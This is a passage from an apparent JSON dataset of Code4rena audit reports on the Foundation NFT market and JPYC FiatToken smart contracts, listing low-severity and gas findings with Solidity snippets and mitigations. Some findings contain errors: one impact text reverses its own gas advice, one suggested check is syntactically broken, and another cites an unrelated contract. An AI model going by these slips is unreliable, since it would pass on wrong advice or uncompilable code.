Reference\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L336\n\n\n # C4-003 : Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n\n## Impact - LOW\n\nThe buyFromPrivateSaleFor function of nftContract is called when transferring the nft to the person. However, this function does not check whether the recipient is aware of the ERC721 protocol and calls _transfer directly. If the recipient is a contract not aware of incoming NFTs, then the transferred NFT would be locked in the recipient forever.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n2. transfer/transferFrom functions are used instead of safe transfer/transferFrom on the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L177\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse the _safeTransfer function instead, which checks if the recipient contract implements the onERC721Received interface to avoid loss of NFTs.\n\n\n # C4-004 : ReentrancyGuardUpgradeable contract is not initialized\n\n## Impact - LOW\n\nThe ReentrancyGuardUpgradeable contract is not initialized through constructor.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/FNDNFTMarket.sol#L73\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider initializing the Upgradeable contract in the constructor/initializer function. \n\n\n # C4-005 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/FNDNFTMarket.sol#L105\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/FoundationTreasury.sol#L61\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketAuction.sol#L22\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n# C4-006 : Use of Block.timestamp\n\n## Impact -  Non-Critical\n\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L389\n```\n\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nBlock timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-foundation-findings",
      "repo": "https://github.com/code-423n4/2022-02-foundation-findings",
      "url": "https://github.com/code-423n4/2022-02-foundation-findings/issues/61"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# C4-001 : Use of _msgSender()\n\n## Impact\n\nThe use of _msgSender() when there is no implementation of a meta transaction mechanism that uses it, such as EIP-2771, very slightly increases gas consumption.\n\n\n## Proof of Concept\n\n_msgSender() is utilized three times where msg.sender could have been used in the following function.\n\n\n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Ownable.sol#L43\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nReplace _msgSender() with msg.sender if there is no mechanism to support meta-transactions like EIP-2771 implemented.\n\n# C4-002: Adding unchecked directive can save gas\n\n## Impact\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\n## Proof of Concept\n\n1. Navigate to the following contract.  Apply unchecked directive where overflow/underflow is not possible.\n\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L326\n\n```\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal override {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(\n            value <= balances[from],\n            \"ERC20: transfer amount exceeds balance\"\n        );\n\n        balances[from] = balances[from] - value;\n        balances[to] = balances[to] + value;\n        emit Transfer(from, to, value);\n    }\n\n\n```\n\n2. Consider the all functions. And apply changes regarding to openzeppelin.\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L238\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider applying unchecked arithmetic where overflow/underflow is not possible.\n\n\n```\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n        _balances[to] += amount;\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n```\n\n\n# C4-003: `> 0 can be replaced with != 0 for gas optimization`\n\n## Impact\n\n`!= 0` is a cheaper operation compared to `> 0`, when dealing with uint.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L143\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L378\n```\n\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse \"!=0\" instead of \">0\" for the gas optimization.",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/55"
    }
  },
  {
    "title": "QA Report",
    "body": "---\n# Title\nUsing address(0) does not make sense\n\n# Vulnerability details\n\n## Impact\nUsing address(0) does not make sense for the event. It should use a more explicit address such as msg.sender. Developers cannot figure out where Transfer event is emitted from if it uses address(0).\n\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L148\n\n```\nemit Transfer(address(0), _to, _amount);\n```\n\n## Tools Used\nStatic code analysis\n\n## Recommended Mitigation steps\nUse either msg.sender or address(this) depending on the specification of the contract.\n\n```\nemit Transfer(msg.sender, _to, _amount);\n```\n\n---\n# Title\nInconsistent usage of whenNotPaused modifier\n\n# Vulnerability details\n## Impact\n[configureMinter function](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L327-L332) has whenNotPaused modifier while [removeMinter function](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L344-L348) does not have whenNotPaused. \n\nInconsistent usage of whenNotPaused would cause unexpected behavior.\n\n## Proof of Concept\nremoveMinter function does not use whenNotPaused modifier\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L344-L348\n\n```\n    function removeMinter(address minter)\n        external\n        onlyMasterMinter\n        returns (bool)\n    {\n```\n\n## Tools Used\nStatic code analysis\n\n## Recommended Mitigation steps\nAdd whenNotPaused modifier at removeMinter function to be consistent with other functions.\n\n```\n    function removeMinter(address minter)\n        external\n        whenNotPaused\n        onlyMasterMinter\n        returns (bool)\n    {\n```\n\n---\n# Title\nInconsistency of messages in require function\n\n# Vulnerability details\n\n## Impact\nThe require check has the prefix of FiatToken: or ERC20: at FiatTokenV1.sol.\nIf require check is done under FiatTokenV1.sol, it should use one of them.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L245-L246\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L273\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L309-L313\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L447\n\n## Tools Used\nStatic code analysis\n\n## Recommended Mitigation steps\nUse FiatToken: for the consistency\n\n---\n# Title\nNaming inconsistency at variables\n\n# Vulnerability details\n\n## Impact\nFiatTokenV1.sol does not have naming consistency on variables. It may confuse developers without standardized naming styles. \n\n## Proof of Concept\n\n### Function arguments\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L127\n```\nfunction mint(address _to, uint256 _amount)\n```\n\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L361\n```\nfunction burn(uint256 _amount)\n```\n\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L377\n```\nfunction updateMasterMinter(address _newMasterMinter) external onlyOwner {\n```\n\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L623-L666\n```\nmodifier checkWhitelist(address _account, uint256 _value) {\n\nfunction isWhitelisted(address _account) external view returns (bool) {\n\nfunction whitelist(address _account) external onlyWhitelister {\n\nfunction unWhitelist(address _account) external onlyWhitelister {\n\nfunction updateWhitelister(address _newWhitelister) external onlyOwner {\n```\n\n### State variables\nOnly ``totalSupply_`` contains ``_``. Other state variables do not contain ``_``.\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L58\n```\nuint256 internal totalSupply_ = 0;\n```\n\n### Event\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L70-L71\n```\n    event Whitelisted(address indexed _account);\n    event UnWhitelisted(address indexed _account);\n```\n\n\n## Tools Used\nStatic code analysis\n\n## Recommended Mitigation steps\nSet the standards for variables naming styles. \nIt seems that other function arguments do not have ``_`` in their prefixes, so removing ``_`` looks consistent. \n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L127\n```\nfunction mint(address to, uint256 amount)\n```\n\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L361\n```\nfunction burn(uint256 amount)\n```\n\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L377\n```\nfunction updateMasterMinter(address newMasterMinter) external onlyOwner {\n```\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L623-L666\n```\nmodifier checkWhitelist(address account, uint256 value) {\n\nfunction isWhitelisted(address account) external view returns (bool) {\n\nfunction whitelist(address account) external onlyWhitelister {\n\nfunction unWhitelist(address account) external onlyWhitelister {\n\nfunction updateWhitelister(address newWhitelister) external onlyOwner {\n```\n\nOf course, change remove ``_`` from their prefixes inside these functions as well.\n\n\n\nAs for state variables, other state variables do not use ``_`` in their suffixes, so removing ``_`` seems legit.\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L58\n```\nuint256 internal totalSupply = 0;\n```\n\nArguments used in the Event can follow the other patterns as well.\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L70-L71\n```\n    event Whitelisted(address indexed account);\n    event UnWhitelisted(address indexed account);\n```\n\n\n\n---\n# Title\nIs minters variable needed? \n\n# Vulnerability details\n\n## Impact\nIt looks like the role of ``minters`` and ``minterAllowed`` looks similar, and it may be able to combine them into one. Using extra state variables will increase gas usage.\n\n## Proof of Concept\n\n\n### State variable definitions\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L59-L60\n```\n    mapping(address => bool) internal minters;\n    mapping(address => uint256) internal minterAllowed;\n```\n\n### Relevant functions\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L333-L334\n```\n    function configureMinter(address minter, uint256 minterAllowedAmount)\n        external\n        whenNotPaused\n        onlyMasterMinter\n        returns (bool)\n    {\n        minters[minter] = true;\n        minterAllowed[minter] = minterAllowedAmount;\n        emit MinterConfigured(minter, minterAllowedAmount);\n        return true;\n    }\n```\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L344-L353\n```\n    function removeMinter(address minter)\n        external\n        onlyMasterMinter\n        returns (bool)\n    {\n        minters[minter] = false;\n        minterAllowed[minter] = 0;\n        emit MinterRemoved(minter);\n        return true;\n    }\n```\n\nWhen removing minter role from account, it sets 0 at ``minterAllowed`` variable. ``minterAllowed[minter] = 0``\nSo technically ``minters`` variable seems not needed, and without ``minters`` it can maintain the same logic.\nBy removing ``minters`` variable, it can save followings:\n- Removal of [the definition of ``minters`` state variable](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L59)\n- Removal of [the logic setting true at ``minters`` variables in ``configureMinter`` function](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L333)\n- Removal of [the logic setting false at ``minters`` variable in ``removeMinter`` function](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L349)\n\n\n## Tools Used\nmanual check\n\n## Recommended Mitigation steps\n- Remove ``minters`` state variables\n- Change the logic to use ``minterAllowed`` state variables where ``minters`` was previously used\nSpecifically following codes need to be changed:\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L116\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L176\n\n\n---\n# Title\nThe original file should follow the recommended order of functions\n\n# Vulnerability details\n\n## Impact\nSolidity defines the style guide for the order of functions.\nhttps://docs.soliditylang.org/en/v0.8.12/style-guide.html?highlight=coding%20style#order-of-functions\n\nit is not efficient to reorder codes of libraries such as OpenZeppelin, but at least [FiatTokenV1.sol](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol) can follow the style guide.\n\nFollowing the style guide of solidity increases the readability.\n\n## Proof of Concept\nhttps://docs.soliditylang.org/en/v0.8.12/style-guide.html?highlight=coding%20style#order-of-functions\n\n## Tools Used\nStatic code analysis\n\n## Recommended Mitigation steps\nFollow [the style guide of solidity](https://docs.soliditylang.org/en/v0.8.12/style-guide.html?highlight=coding%20style#order-of-functions)\n\n---\n# Title\nRemove functionDelegateCall function from Address library \n\n## Vulnerability details\nAs for the usage of delegatecall at the logic contract, OpenZeppalin manual explains [as follows](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#potentially-unsafe-operations).\n```\nA similar effect can be achieved if the logic contract contains a delegatecall operation. If the contract can be made to delegatecall into a malicious contract that contains a selfdestruct, then the calling contract will be destroyed.\n```\n\nBecause of this reason, OpenZeppelin's upgradeable version ([AddressUpgradeable.sol](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/utils/AddressUpgradeable.sol)) does not include ``functionDelegateCall`` function. \n\n## Impact\n\n\n## Proof of Concept\n\n[Address.sol#L169-L188](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/Address.sol#L169-L188) contains functionDelegateCall function which should not be included at the logic contract.\n```\nfunction functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n    return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n}\n...\nfunction functionDelegateCall(\n    address target,\n    bytes memory data,\n    string memory errorMessage\n) internal returns (bytes memory) {\n    require(isContract(target), \"Address: delegate call to non-contract\");\n\n    (bool success, bytes memory returndata) = target.delegatecall(data);\n    return verifyCallResult(success, returndata, errorMessage);\n}\n```\n\n## Tools Used\nStatic analysis\n\n## Recommended Mitigation steps\nEither remove functionDelegateCall function from [Address.sol](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/Address.sol#L169-L188) or use [AddressUpgradeable.sol](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/utils/AddressUpgradeable.sol) instead of [Address.sol](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/Address.sol).\n\n---\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/52"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "---\n\n# Title\nInitializing uint256 variable with 0 will increase the gas\n\n# Vulnerability details\n\n## Impact\nInitializing uint256 variable with 0 will increase the gas.\n\n## Proof of Concept\n\n[FiatTokenV1.sol#L58](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L58)\n```\nuint256 internal totalSupply_ = 0;\n```\n\n## Tools Used\nStatic code analysis\n\n## Recommended Mitigation steps\nStop initializing the variable with 0.\n\n```\nuint256 internal totalSupply_;\n```\n\n---\n\n# Title\nUse != 0 instead of > 0 to have gas efficiency\n\n# Vulnerability details\n\n## Impact\nUsing != 0 can increase the gas cost. It should use > 0 instead. \n\n## Proof of Concept\n[FiatTokenV1.sol#L136](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L136)\n```\nrequire(_amount > 0, \"FiatToken: mint amount not greater than 0\");\n```\n\n[FiatTokenV1.sol#L368](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L368)\n```\nrequire(_amount > 0, \"FiatToken: burn amount not greater than 0\");\n```\n\n``_amount`` is uint256, so it does not need to check minus. \n\n\n## Tools Used\nStatic code analysis\n\n## Recommended Mitigation steps\n\n[FiatTokenV1.sol#L136](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L136)\n```\nrequire(_amount != 0, \"FiatToken: mint amount not greater than 0\");\n```\n\n[FiatTokenV1.sol#L368](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L368)\n```\nrequire(_amount != 0, \"FiatToken: burn amount not greater than 0\");\n```\n\n---\n# Title\nReordering the state variables can reduce slot size\n\n# Vulnerability details\n\n## Impact\nThere is an opportunity to reduce the slot size by reordering the state variables. \n\n## Proof of Concept\n\n[FiatTokenV1.sol#L51-L54](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L51-L54)\n```\n    uint8 public decimals;\n    string public currency;\n    address public masterMinter;\n    bool internal initialized;\n```\n\n## Tools Used\nUsed [test/storageSlot/storageSlots.behavior.js](https://github.com/code-423n4/2022-02-jpyc/blob/main/test/storageSlot/storageSlots.behavior.js) to check that the slot size can be reduced from 520 to 519.\n\n## Recommended Mitigation steps\n- Reorder the state variable\n- Update the relevant test: [test/storageSlot/storageSlots.behavior.js](https://github.com/code-423n4/2022-02-jpyc/blob/main/test/storageSlot/storageSlots.behavior.js)\n\n---\n# Title\nAdding checked directive can save gas at FiatTokenV1.sol\n\n# Vulnerability details\n\n## Impact\nSolidity v0.8 has default over and under-flown checks. Hence, the unchecked directives can be used for arithmetic operations that will never over or under-flown. [Please refer to the Solidity manual](https://docs.soliditylang.org/en/v0.8.11/control-structures.html#checked-or-unchecked-arithmetic)\n\n## Proof of Concept\nFollowing codes can be wrapped by unchecked directives since the required check before these lines assert that the line will not be less than 0.\n\n[FiatTokenV1.sol#L146](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L146)\n```\nrequire(\n    _amount <= mintingAllowedAmount,\n    \"FiatToken: mint amount exceeds minterAllowance\"\n);\n\ntotalSupply_ = totalSupply_ + _amount;\nbalances[_to] = balances[_to] + _amount;\nminterAllowed[msg.sender] = mintingAllowedAmount - _amount; // <--- this line can be wrapped by unchecked\n```\n\n[FiatTokenV1.sol#L276](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L276)\n```\nrequire(\n    value <= allowed[from][msg.sender],\n    \"ERC20: transfer amount exceeds allowance\"\n);\n_transfer(from, to, value);\nallowed[from][msg.sender] = allowed[from][msg.sender] - value; // <--- this line can be wrapped by unchecked\n```\n\n[FiatTokenV1.sol#L316](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L316)\n```\nrequire(\n    value <= balances[from],\n    \"ERC20: transfer amount exceeds balance\"\n);\n\nbalances[from] = balances[from] - value; // <--- this line can be wrapped by unchecked\n```\n\n[FiatTokenV1.sol#L371-L372](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L371-L372)\n```\nrequire(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\n\ntotalSupply_ = totalSupply_ - _amount;     // <--- this line can be wrapped by unchecked\nbalances[msg.sender] = balance - _amount;  // <--- this line can be wrapped by unchecked\n```\n \n[FiatTokenV1.sol#L449](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L449)\n```\nrequire(\n    decrement <= allowed[owner][spender],\n    \"ERC20: decreased allowance below zero\"\n);\n_approve(owner, spender, allowed[owner][spender] - decrement); // <--- this line can be wrapped by unchecked\n```\n\n## Tools Used\nStatic code analysis\n\n## Recommended Mitigation steps\n\nThe above-mentioned codes can be written as follows to use unchecked directives:\n\n[FiatTokenV1.sol#L146](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L146)\n```\nrequire(\n    _amount <= mintingAllowedAmount,\n    \"FiatToken: mint amount exceeds minterAllowance\"\n);\n\ntotalSupply_ = totalSupply_ + _amount;\nbalances[_to] = balances[_to] + _amount;\nunchecked {\n    minterAllowed[msg.sender] = mintingAllowedAmount - _amount;\n}\n```\n\n[FiatTokenV1.sol#L276](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L276)\n```\nrequire(\n    value <= allowed[from][msg.sender],\n    \"ERC20: transfer amount exceeds allowance\"\n);\n_transfer(from, to, value);\nunchecked {\n    allowed[from][msg.sender] = allowed[from][msg.sender] - value;\n}\n```\n\n[FiatTokenV1.sol#L316](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L316)\n```\nrequire(\n    value <= balances[from],\n    \"ERC20: transfer amount exceeds balance\"\n);\nunchecked {\n    balances[from] = balances[from] - value;\n}\n```\n\n[FiatTokenV1.sol#L371-L372](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L371-L372)\n```\nrequire(balance >= _amount, \"FiatToken: burn amount exceeds balance\");\nunchecked {\n    totalSupply_ = totalSupply_ - _amount;\n    balances[msg.sender] = balance - _amount;\n}\n```\n\n\n[FiatTokenV1.sol#L449](https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L449)\n```\nrequire(\n    decrement <= allowed[owner][spender],\n    \"ERC20: decreased allowance below zero\"\n);\nunchecked {\n    _approve(owner, spender, allowed[owner][spender] - decrement);\n}\n```\n\n---\n",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/51"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. set constant for save more gas\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol\n   \n    on `FiatTokenV2.sol` and `FiatTokenV1.sol`, `name` , `symbol`, `decimals`  and `curenccy` can be set as constant inside contract so it would be more gas efficient.\n    \n\n2. Unnecesary `SafeERC20` lib usage\n\nhttps://github.com/code-423n4/2022-02-jypc/blob/main/contracts/v1/Rescuable.sol#L32\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Rescuable.sol#L65\n\nThe only `SafeERC20.functions()` are used in this contract is `safeTransferFrom()` & `safeTransfer()`. Using `transfer` & `transferFrom` function from `ERC20` is the better way\nfor gas saving\n\n3. Use the same compiler as before for saving more gas\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/StorageSlot.sol\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/draft-IERC1822.sol\n\n4. Dont set `uint` value\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L58\nthe default value of uint is 0. dont set it to save gas\n```\n    uint256 internal totalSupply_ = 0;\n```\t\n\n5. != operator can save gas\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/FiatTokenV1.sol#L136\nusing != to validate `_amount` can save gas",
    "dataSource": {
      "name": "code-423n4/2022-02-jpyc-findings",
      "repo": "https://github.com/code-423n4/2022-02-jpyc-findings",
      "url": "https://github.com/code-423n4/2022-02-jpyc-findings/issues/49"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : transferOwnership/updateRescuer should be two step process\n\n## Impact -  LOW\n\n\"FiatTokenV2.sol\" inherit OpenZeppelin's Ownable contract which enables the onlyOwner role to transfer ownership to another address. It's possible that the onlyOwner role mistakenly transfers ownership to the wrong address, resulting in a loss of the onlyOwner role. The current ownership transfer process involves the current owner calling Unlock.transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier. Lack of two-step procedure for critical operations leaves them error-prone\nif the address is incorrect, the new address will take on the functionality of the new role immediately.\n\nRescuer update progress should be two step procedure.\n\nfor Ex : -Alice deploys a new version of the whitehack group address. When she invokes the whitehack group address setter to replace the address, she accidentally enters the wrong address. The new address now has access to the role immediately and is too late to revert\n\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Ownable.sol#L60\" and \"https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v1/Rescuable.sol#L72\"\n2. The contracts have many onlyOwner function.\n3. The contract is inherited from the Ownable which includes transferOwnership.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement zero address check and Consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n# C4-002 : Missing Conditional Check In the Allowance\n\n## Impact - LOW\n\nDuring the code review, It has been observed that If the allowance is given maximum uint. The check should be nice to have check if the current allowance is maximum.\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/v2/FiatTokenV2.sol#L281\"\n2. The max allowance check has not been checked on the function.\n\nEnsure that is the required checks are compatible with Openzeppelin ERC20.\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L336\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement the following check in the related function.\n\n```\n if (allowed[from][msg.sender != type(uint256).max)\n```\n\n## Reference\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L336\n\n# C4-003 : Use of ecrecover is susceptible to signature malleability\n\n## Impact - LOW\n\nThe ecrecover function is used EIP-3009 to recover the address from the signature. The built-in EVM precompile ecrecover is susceptible to signature malleability which could lead to replay attacks (references: https://swcregistry.io/docs/SWC-117, https://swcregistry.io/docs/SWC-121 and https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57).\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-02-jpyc/blob/main/contracts/util/ECRecover.sol#L70\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider using OpenZeppelin’s ECDSA library (which prevents this malleability) instead of the built-in function.\n\n# C4-004 : Missing events for admin/rescuer only functions that change critical parameters and function flows\n\n## Impact LOW\n\nThe admin only functions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity 